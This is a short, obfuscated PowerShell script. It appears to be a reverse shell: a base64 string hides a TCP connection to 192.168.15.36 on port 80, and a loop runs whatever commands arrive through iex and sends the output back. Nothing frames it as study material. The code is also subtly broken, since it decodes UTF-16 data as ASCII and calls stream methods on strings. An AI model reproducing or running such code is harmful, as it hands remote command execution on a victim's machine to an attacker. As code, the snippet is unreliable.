$sm='KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAOQAyAC4AMQA2ADgALgAxADUALgAzADYAJwAsADgAMAApACkALgBHAGUAdABTAHQAcgBlAGEAbQAoACkA';
[byte[]]$bt=0..65535|%{0};
while(($i=[System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($sm)).Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));
$sm.Write($st,0,$st.Length)}